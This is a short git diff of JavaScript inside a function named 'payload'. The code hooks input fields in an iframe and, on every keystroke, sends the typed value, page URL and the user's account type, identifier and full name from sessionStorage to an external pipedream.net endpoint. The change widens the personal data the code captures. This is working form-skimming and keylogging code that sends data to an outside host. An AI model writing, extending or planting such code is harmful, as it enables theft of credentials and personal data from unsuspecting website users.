@@ -84,12 +84,16 @@ async function payload() {
 
 					const eventType = field.tagName === 'INPUT' ? 'input' : 'input';
 
+					const sc = JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0]
+
 					field.addEventListener('input', async function() {
 					const data = { 
 						input: this.name || this.id || this.type || this.className || 'field',
 						value: this.value || this.innerText,
 						location: i.contentWindow.location.href,
-						name: JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].identifiant
+						type: sc.typeCompte,
+						name: sc.identifiant,
+						nom: sc.nom + sc.prenom
 					};
 					await fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
 						method: "POST",
